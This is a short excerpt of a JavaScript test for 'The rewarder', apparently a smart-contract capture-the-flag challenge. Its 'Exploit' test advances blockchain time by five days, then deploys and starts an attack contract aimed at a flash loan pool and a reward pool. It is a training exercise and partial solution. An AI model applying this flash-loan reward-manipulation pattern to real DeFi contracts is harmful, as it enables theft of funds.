...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        const TheRewardAttackFactory = await ethers.getContractFactory('TheRewardAttack', attacker);
        this.theRewardAttack = await TheRewardAttackFactory.connect(attacker).deploy(this.flashLoanPool.address, this.liquidityToken.address, this.rewarderPool.address);
        await this.theRewardAttack.start();
    });
